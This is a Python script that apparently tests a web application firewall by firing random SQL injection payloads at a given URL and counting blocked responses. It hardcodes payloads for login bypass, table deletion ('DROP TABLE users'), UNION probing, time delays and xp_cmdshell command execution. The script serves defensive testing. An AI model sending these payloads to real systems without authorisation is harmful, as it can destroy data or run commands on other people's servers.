#!/usr/bin/env python3
"""Simulate SQL injection attacks against WAF-protected endpoint."""

import argparse
import random
import time
import urllib.parse
import urllib.request

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1' WAITFOR DELAY '0:0:5'--",
    "'; EXEC xp_cmdshell('whoami')--",
    "1' ORDER BY 10--",
]

PATHS = ["/login", "/search", "/api/users", "/products", "/admin"]


def send_request(base_url: str, path: str, payload: str) -> tuple[int, str]:
    params = urllib.parse.urlencode({"q": payload, "id": payload, "user": payload})
    url = f"{base_url.rstrip('/')}{path}?{params}"
    req = urllib.request.Request(url, headers={"User-Agent": "WAF-Simulator/SQLi"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read(200).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200).decode("utf-8", errors="replace")
    except Exception as e:
        return 0, str(e)


def main():
    parser = argparse.ArgumentParser(description="Simulate SQLi attacks for WAF log generation")
    parser.add_argument("--url", required=True, help="Target ALB URL (http://...)")
    parser.add_argument("--count", type=int, default=50, help="Number of requests")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    args = parser.parse_args()

    print(f"Starting SQLi simulation: {args.count} requests to {args.url}")
    blocked = 0
    for i in range(args.count):
        path = random.choice(PATHS)
        payload = random.choice(SQLI_PAYLOADS)
        status, _ = send_request(args.url, path, payload)
        if status in (403, 0):
            blocked += 1
        print(f"[{i+1}/{args.count}] {path} -> HTTP {status}")
        time.sleep(args.delay)

    print(f"\nComplete: {blocked}/{args.count} likely blocked")


if __name__ == "__main__":
    main()
